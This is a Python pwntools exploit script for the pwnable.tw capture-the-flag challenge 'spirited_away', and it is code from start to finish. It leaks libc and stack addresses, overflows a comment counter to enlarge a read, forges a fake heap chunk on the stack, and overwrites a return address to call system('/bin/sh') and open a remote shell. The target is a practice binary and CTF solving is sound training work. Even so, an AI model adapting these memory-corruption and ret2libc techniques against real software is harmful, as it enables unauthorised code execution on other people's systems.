from pwn import *
import time

r = remote("chall.pwnable.tw", 10204)
#r = process("spirited_away")
# r = process('./spirited_away_copy', env={"LD_PRELOAD":"./libc_32.so.6"})
libc = ELF("./libc_32.so.6")
# libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")

comment_num = 0

def input(name, age, reason, comment):
    global comment_num
    comment_num += 1
    print("comment_num: ", comment_num)
    r.recvuntil("your name: ") # name
    r.sendline(name)
    r.recvuntil("your age: ") # age
    r.sendline(age)
    r.recvuntil("this movie? ") # reason
    r.send(reason)
    r.recvuntil("your comment: ") # comment
    r.sendline(comment) 
    
    return r.recvuntil("comment so far. ")

output = input("no", "20", "1"*0x18, "no")
reason_leak_idx = output.find(b"Reason: ") + 8 + 0x18
leak = u32(output[reason_leak_idx: reason_leak_idx+4]) 
#print("leak: ", hex(leak))
#print("libc.symbols[b'_IO_file_sync']: ", hex(libc.symbols[b'_IO_file_sync']))
#r.interactive()
libc_base = leak - (libc.symbols[b'_IO_file_sync'] + 7)
#libc_base = leak - 0x1d8d80 #- 0x73231
print("libc_base: ", hex(libc_base))
r.recvuntil("another comment? <y/n>: ")
r.sendline("y")

output = input("no", "20", "a"*31, "no")
#print(output)
reason_leak_idx = output.find(b"Reason: ") + (8+32)
stack_base = u32(output[reason_leak_idx: reason_leak_idx+4]) - 0xf8
print("stack_base: ", hex(stack_base))
r.recvuntil("another comment? <y/n>: ")
r.sendline("y")

comment_stack = stack_base + 0x10

## %d comment so far. We will review them as soon as we can
## stack overflow to name's malloc size
for _ in range(98):
    output = input( "1"*0x3c, "1", "2"*0x50, "3"*0x3c)
    time.sleep(0.1)
    r.recvuntil("another comment? <y/n>: ")
    r.sendline("y")




# v2 = 0x6e
name_payload = "1"*0x3c
age_payload = "1"

r.recvuntil("your name: ") # name
r.send("tttttt")
r.recvuntil("your age: ") # age
r.send("1")
r.recvuntil("this movie? ") # reason
fake_chunk_content = p32(0x0)*3 + p32(0x41) + b"y"*0x38 
r.sendline(fake_chunk_content)
r.recvuntil("your comment: ") # comment
fake_chunk_addr = stack_base + 0xb0
print("fake_chunk_addr: ", hex(fake_chunk_addr))
r.send(b"z"*0x54 + p32(fake_chunk_addr) + p32(0x0) + p32(0x41)) 


r.recvuntil("another comment? <y/n>: ")
r.sendline("y")

system_addr = libc_base + libc.symbols[b'system']
sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
print("system_addr: ", hex(system_addr))
print("sh_addr: ", hex(sh_addr))

#one_gadget = 0x5f066 # 0x3a819, 0x5f065, 0x5f066
## one_gadget

r.recvuntil("your name: ")
#r.send(b"6"*0x4c + p32(0xdeadbeef))
r.send(b"6"*0x4c + p32(system_addr) + b"6"*4 + p32(sh_addr))
#r.send(b"6"*0x4c + p32(one_gadget + libc_base))

r.recvuntil("your age: ") 
r.sendline("1") 
r.recvuntil("see this movie? ") 
r.send("1") 
r.recvuntil("your comment: ") 
r.send("1")
r.interactive()
r.recvuntil("comment? <y/n>: ") 
r.sendline("n")






ebp_addr = stack_base + 0xf8


